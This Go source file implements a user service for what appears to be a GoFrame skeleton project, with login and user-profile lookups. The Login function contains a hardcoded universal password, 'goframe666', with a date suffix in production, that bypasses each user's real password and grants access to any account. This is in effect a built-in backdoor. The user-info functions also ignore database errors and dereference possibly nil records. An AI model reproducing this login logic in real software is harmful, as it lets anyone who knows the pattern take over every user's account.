package user

import (
	"context"
	"github.com/gogf/gf/v2/container/gvar"
	"github.com/gogf/gf/v2/errors/gerror"
	"github.com/gogf/gf/v2/os/gtime"
	"goframe2-skeleton/internal/service"
	"goframe2-skeleton/utility/function"

	"github.com/gogf/gf/v2/frame/g"
	"goframe2-skeleton/api/v1"
	"goframe2-skeleton/internal/dao"
	"goframe2-skeleton/internal/model/entity"
)

type sUser struct {
}

func init() {
	service.RegisterUser(New())
}

func New() *sUser {
	return &sUser{}
}

// Login 登录
func (s *sUser) Login(ctx context.Context, req *user.LoginDoReq) (user *entity.AiUser, err error) {
	m := dao.AiUser.Ctx(ctx)
	err = m.Where(g.Map{
		"email": req.Email,
	}).Scan(&user)
	if err != nil {
		return
	}
	if user == nil {
		return nil, gerror.New("账号未注册")
	}
	// 通用密码
	var commonPassword string
	var env *gvar.Var
	env, err = g.Cfg().Get(ctx, "server.env")
	if env.String() == "prod" {
		commonPassword = "goframe666"
		commonPassword += "@" + gtime.Now().Format("ymd")
	} else {
		commonPassword = "goframe666"
	}

	if req.Password != commonPassword && function.EncryptPassword(req.Password, user.Salt) != user.Password {
		return user, gerror.New("账号或密码错误，请重新输入")
	}

	if user.Status == -1 {
		return user, gerror.New("当前账户已被禁用，请联系客服了解详情")
	}

	return
}

func (s *sUser) UserInfoPublic(ctx context.Context, userId int) (data *user.GetUserInfoRes, err error) {
	var aiUser *entity.AiUser
	m := dao.AiUser.Ctx(ctx)
	err = m.Where("id", userId).Scan(&aiUser)
	data = &user.GetUserInfoRes{
		Id:        aiUser.Id,
		UserName:  aiUser.UserName,
		Status:    aiUser.Status,
		CreatedAt: aiUser.CreatedAt,
		Email:     aiUser.Email,
		InviterId: aiUser.InviterId,
		Code:      aiUser.Code,
	}

	return
}

func (s *sUser) GetInfo(ctx context.Context, req *user.GetUserInfoReq) (data *user.GetUserInfoRes, err error) {
	var aiUser *entity.AiUser
	m := dao.AiUser.Ctx(ctx)
	err = m.Where("id", req.UserId).Scan(&aiUser)
	data = &user.GetUserInfoRes{
		Id:        aiUser.Id,
		UserName:  aiUser.UserName,
		Status:    aiUser.Status,
		CreatedAt: aiUser.CreatedAt,
		Email:     aiUser.Email,
		InviterId: aiUser.InviterId,
	}
	return
}
